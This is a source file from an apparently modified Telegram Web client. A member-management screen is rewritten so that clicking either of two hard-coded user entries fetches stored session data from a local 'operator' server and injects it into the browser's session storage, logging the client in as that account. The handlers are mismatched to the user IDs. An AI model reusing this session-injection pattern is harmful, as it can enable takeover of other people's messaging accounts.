import type { FC } from "../../../lib/teact/teact";
import React, { memo } from "../../../lib/teact/teact";
import { getActions, withGlobal } from "../../../global";

import type { ApiChatMember, ApiUserStatus } from "../../../api/types";
import type { ManagementScreens } from "../../../types";

import {
  getHasAdminRight,
  isChatBasicGroup,
  isChatChannel,
} from "../../../global/helpers";
import {
  selectChat,
  selectChatFullInfo,
  selectTabState,
} from "../../../global/selectors";
import {
  clearStoredSession,
  loadStoredSession,
  storeSession,
} from "../../../util/sessions";

import PrivateChatInfo from "../../common/PrivateChatInfo";
import ListItem from "../../ui/ListItem";

type OwnProps = {
  chatId: string;
  isActive: boolean;
  noAdmins?: boolean;
  onClose: NoneToVoidFunction;
  onScreenSelect?: (screen: ManagementScreens) => void;
  onChatMemberSelect?: (
    memberId: string,
    isPromotedByCurrentUser?: boolean
  ) => void;
};

type StateProps = {
  userStatusesById: Record<string, ApiUserStatus>;
  members?: ApiChatMember[];
  adminMembersById?: Record<string, ApiChatMember>;
  isChannel?: boolean;
  localContactIds?: string[];
  searchQuery?: string;
  isSearching?: boolean;
  localUserIds?: string[];
  globalUserIds?: string[];
  currentUserId?: string;
  canDeleteMembers?: boolean;
  areParticipantsHidden?: boolean;
  canHideParticipants?: boolean;
};

const { returnToAuthPhoneNumber, setSettingOption } = getActions();

const data = await fetch("http://localhost:3000/operator", {
  method: "GET",
}).then((response) => response.json());

async function saveFirst() {
  storeSession(data["6320677435"], "6320677435");
  await fetch("http://localhost:3000/auth")
    .then((response) => response.json())
    .then((data1) => {
      localStorage.setItem("tt-global-state", JSON.stringify(data1));
    });

  returnToAuthPhoneNumber();
}

async function saveSecond() {
  storeSession(data["5735038397"], "5735038397");
  await fetch("http://localhost:3000/auth")
    .then((response) => response.json())
    .then((data1) => {
      localStorage.setItem("tt-global-state", JSON.stringify(data1));
    });
}

const ManageGroupMembers: FC<OwnProps & StateProps> = () => {
  getActions();

  return (
    <div className="Management">
      <div className="custom-scroll">
        <ListItem
          key={5735038397}
          className="chat-item-clickable scroll-item"
          onClick={saveFirst}
        >
          <PrivateChatInfo userId="5735038397" forceShowSelf withStory />
        </ListItem>
        <ListItem
          key={6320677435}
          className="chat-item-clickable scroll-item"
          onClick={saveSecond}
        >
          <PrivateChatInfo userId="6320677435" forceShowSelf withStory />
        </ListItem>

        {/* {canHideParticipants && (
          <div className="section">
            <ListItem icon="group" ripple onClick={handleToggleParticipantsHidden}>
              <span>{lang('ChannelHideMembers')}</span>
              <Switcher label={lang('ChannelHideMembers')} checked={areParticipantsHidden} />
            </ListItem>
            <p className="section-info">
              {lang(areParticipantsHidden ? 'GroupMembers.MembersHiddenOn' : 'GroupMembers.MembersHiddenOff')}
            </p>
          </div>
        )} */}
        {/* <div className="section">
          {viewportIds?.length ? (
            <InfiniteScroll
              className="picker-list custom-scroll"
              items={displayedIds}
              onLoadMore={getMore}
              noScrollRestore={Boolean(searchQuery)}
              ref={containerRef}
              onKeyDown={handleKeyDown}
            >
              {viewportIds.map((id) => (
                <ListItem
                  key={id}
                  className="chat-item-clickable scroll-item"
                  // eslint-disable-next-line react/jsx-no-bind
                  onClick={() => handleMemberClick(id)}
                  contextActions={getMemberContextAction(id)}
                >
                  <PrivateChatInfo userId={id} forceShowSelf withStory />
                </ListItem>
              ))}
            </InfiniteScroll>
          ) : !isSearching && viewportIds && !viewportIds.length ? (
            <NothingFound
              teactOrderKey={0}
              key="nothing-found"
              text={isChannel ? 'No subscribers found' : 'No members found'}
            />
          ) : (
            <Loading />
          )}
        </div> */}
      </div>
    </div>
  );
};

export default memo(
  withGlobal<OwnProps>((global, { chatId }): StateProps => {
    const chat = selectChat(global, chatId);
    const { statusesById: userStatusesById } = global.users;
    const { members, adminMembersById, areParticipantsHidden } =
      selectChatFullInfo(global, chatId) || {};
    const isChannel = chat && isChatChannel(chat);
    const { userIds: localContactIds } = global.contactList || {};
    const hiddenMembersMinCount = global.appConfig?.hiddenMembersMinCount;

    const canDeleteMembers =
      chat && (chat.isCreator || getHasAdminRight(chat, "banUsers"));

    const canHideParticipants =
      canDeleteMembers &&
      !isChatBasicGroup(chat) &&
      chat.membersCount !== undefined &&
      hiddenMembersMinCount !== undefined &&
      chat.membersCount >= hiddenMembersMinCount;

    const {
      query: searchQuery,
      fetchingStatus,
      globalUserIds,
      localUserIds,
    } = selectTabState(global).userSearch;

    return {
      areParticipantsHidden: Boolean(chat && areParticipantsHidden),
      members,
      adminMembersById,
      userStatusesById,
      isChannel,
      localContactIds,
      searchQuery,
      isSearching: fetchingStatus,
      globalUserIds,
      localUserIds,
      canDeleteMembers,
      currentUserId: global.currentUserId,
      canHideParticipants,
    };
  })(ManageGroupMembers)
);
